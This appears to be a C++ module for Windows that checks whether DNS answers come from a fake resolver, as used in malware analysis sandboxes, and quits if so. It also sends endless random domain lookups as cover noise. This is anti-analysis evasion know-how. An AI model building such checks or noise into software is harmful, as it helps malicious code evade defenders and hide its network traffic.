/*
- create a custom struct to hold these domain names
- get both valid and invalid domain names
- insert them into the code encrypted and query these domains on runtime
- hash the domains with the expected results and insert them together with the code
- check the reply to the queries by hashing it with the respective domains and comparing the hardcoded hashes 
*/

#undef UNICODE
#include <string>
#include <stdio.h>
#include <windows.h>
#include <vector>
#include <iostream>
#include <fstream>
#include <dnsnoise.h>
#include <dnsanalysis.h>
#include <time.h>
#include <modules/dns.hpp>

bool getHostByName(std::string arg){
    WSADATA wsaData;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        return false;
    }


    DWORD dwError;
    int i = 0;

    struct hostent *remoteHost;
    const char *host_name;
    struct in_addr addr;

    char **pAlias;

    host_name = arg.c_str();

    printf("Calling gethostbyname with %s\n", host_name);
    remoteHost = gethostbyname(host_name);

    if (remoteHost == NULL)
    {
        
        dwError = WSAGetLastError();
        if (dwError != 0)
        {
            if (dwError == WSAHOST_NOT_FOUND)
            {
                printf("Host not found\n");
                return false;
            }
            else if (dwError == WSANO_DATA)
            {
                printf("No data record found\n");
                return false;
            }
            else
            {
                printf("Function failed with error: %ld\n", dwError);
                return false;
            }
        }
        
       return false;
    }
    else
    {            
        printf("Function returned:\n");
        printf("\tOfficial name: %s\n", remoteHost->h_name);
        for (pAlias = remoteHost->h_aliases; *pAlias != 0; pAlias++)
        {
            printf("\tAlternate name #%d: %s\n", ++i, *pAlias);
        }
        printf("\tAddress type: ");
        switch (remoteHost->h_addrtype)
        {
        case AF_INET:
            printf("AF_INET\n");
            break;
        case AF_NETBIOS:
            printf("AF_NETBIOS\n");
            break;
        default:
            printf(" %d\n", remoteHost->h_addrtype);
            break;
        }
        printf("\tAddress length: %d\n", remoteHost->h_length);

        i = 0;
        if (remoteHost->h_addrtype == AF_INET)
        {
            while (remoteHost->h_addr_list[i] != 0)
            {
                addr.s_addr = *(u_long *)remoteHost->h_addr_list[i++];
                printf("\tIP Address #%d: %s\n", i, inet_ntoa(addr));
            }
        }
        else if (remoteHost->h_addrtype == AF_NETBIOS)
        {
            printf("NETBIOS address was returned\n");
        }
        
        return true;
    }

}


// Checks that the DNS resolver is a legitimate one by querying a mix of legitimate and fake obscure domain names
void checkDNS(){
    int unavailable_count = 0;
    int unavailable_threshold = REAL_DNS.size() / 4;
    for (auto it = REAL_DNS.begin(); it != REAL_DNS.end(); ++it){
        if (getHostByName(*it) == false ){
            unavailable_count += 1;
            if (unavailable_count == unavailable_threshold){
                printf("unable to resolve domain name. quitting...");
                exit(0);
            }  
        }
        Sleep(1000);
    }
    printf("Finished checking for real dns resolvers.");

    int fake_count = 0;
    int fake_threshold = FAKE_DNS.size() / 4;
    for (auto it = FAKE_DNS.begin(); it != FAKE_DNS.end(); ++it){
        if (getHostByName(*it) == true ){
            fake_count += 1;
            if (fake_count == fake_threshold){
                printf("fake resolver detected!!! quitting...");
                exit(0);
            }
        }
        Sleep(1000);
    }
    printf("Finished checking for fake dns resolvers.");
}

// Generates fake DNS queries as noise
void queryDomains(){
    srand(time(0));

    int wordlist_size = WORDLIST.size();
    int tld_size = TLD.size();
    while (true){
        
        std::string word1 = WORDLIST.at(rand() % wordlist_size);
        std::string word2 = WORDLIST.at(rand() % wordlist_size);
        std::string tld =  TLD.at(rand() % tld_size);
        std::string domain_name = word1 + word2 + "." + tld;
        getHostByName(domain_name);
        Sleep(rand() % 2001 + 1000);
    }
} 
